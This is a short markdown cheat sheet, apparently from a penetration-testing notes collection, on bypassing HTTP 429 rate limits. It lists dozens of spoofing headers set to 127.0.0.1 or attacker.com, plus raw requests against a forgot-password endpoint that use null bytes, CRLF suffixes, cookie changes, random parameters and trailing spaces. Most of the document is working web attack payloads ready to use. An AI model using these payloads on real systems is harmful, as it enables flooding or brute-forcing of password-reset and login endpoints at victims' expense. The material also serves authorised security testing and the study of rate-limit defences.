# Bypass 429 (Too Many Requests)
 
1. Try add some custom header
```
X-Forwarded-For : 127.0.0.1
X-Forwarded-Host : 127.0.0.1
X-Client-IP : 127.0.0.1
X-Remote-IP : 127.0.0.1
X-Remote-Addr : 127.0.0.1
X-Host : 127.0.0.1
X-Forwarded-For: [attacker.com](http://attacker.com/)

X-Forwarded-Host: [attacker.com](http://attacker.com/)

X-Forwarded-Proto headers: [attacker.com](http://attacker.com/)

Host: [attacker.com](http://attacker.com/) (duplicate this header)

X-Host: [attacker.com](http://attacker.com/)

X-Forwarded-Server: [attacker.com](http://attacker.com/)

X-HTTP-Host-Override: [attacker.com](http://attacker.com/)

Forwarded: [attacker.com](http://attacker.com/)

Base-Url: 127.0.0.1
Client-IP: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
Http-Url: 127.0.0.1
nullOrigin: 127.0.0.1
Origin: 127.0.0.1
Proxy-Host: 127.0.0.1
Proxy-Url: 127.0.0.1
Real-Ip: 127.0.0.1
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Custom-IP-Authorization:127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Port: 127.0.0.1
X-Forwarded-Scheme: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Frame-Options: Allow
X-Host: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Rewrite-Url: 127.0.0.1
```
For example:
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
X-Forwarded-For : 127.0.0.1
...

email=victim@gmail.com
```

2. Adding Null Byte ( %00 ) or CRLF ( %09, %0d, %0a ) at the end of the Email can bypass rate limit.
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
...

email=victim@gmail.com%00
```

3. Try changing user-agents, cookies and IP address
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: xxxxxxxxxx
...

email=victim@gmail.com
```
Try this to bypass
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: aaaaaaaaaaaaa
...

email=victim@gmail.com
```

4. Add a random parameter on the last endpoint
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
...

email=victim@gmail.com
```
Try this to bypass
```
POST /ForgotPass.php?random HTTP/1.1
Host: target.com
...

email=victim@gmail.com
```

5. Add space after the parameter value
```
POST /api/forgotpass HTTP/1.1
Host: target.com
...

{"email":"victim@gmail.com"}
```
Try this to bypass
```
POST /api/forgotpass HTTP/1.1
Host: target.com
...

{"email":"victim@gmail.com "}
```

## References
* [Huzaifa Tahir](https://huzaifa-tahir.medium.com/methods-to-bypass-rate-limit-5185e6c67ecd)
* [Gupta Bless](https://gupta-bless.medium.com/rate-limiting-and-its-bypassing-5146743b16be)
